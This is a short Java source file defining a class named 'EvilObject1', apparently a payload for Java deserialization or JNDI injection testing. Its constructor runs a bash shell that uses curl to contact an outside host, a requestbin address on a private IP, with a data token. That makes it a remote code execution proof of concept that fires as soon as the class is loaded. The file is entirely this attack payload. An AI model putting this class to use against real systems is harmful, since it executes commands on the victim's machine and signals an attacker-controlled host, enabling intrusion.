public class EvilObject1 {
    public EvilObject1() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"/bin/bash", "-c", " curl http://192.168.230.128:3000/requestbin?data=6875976224fc4e12bc0d028d33130ce3"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
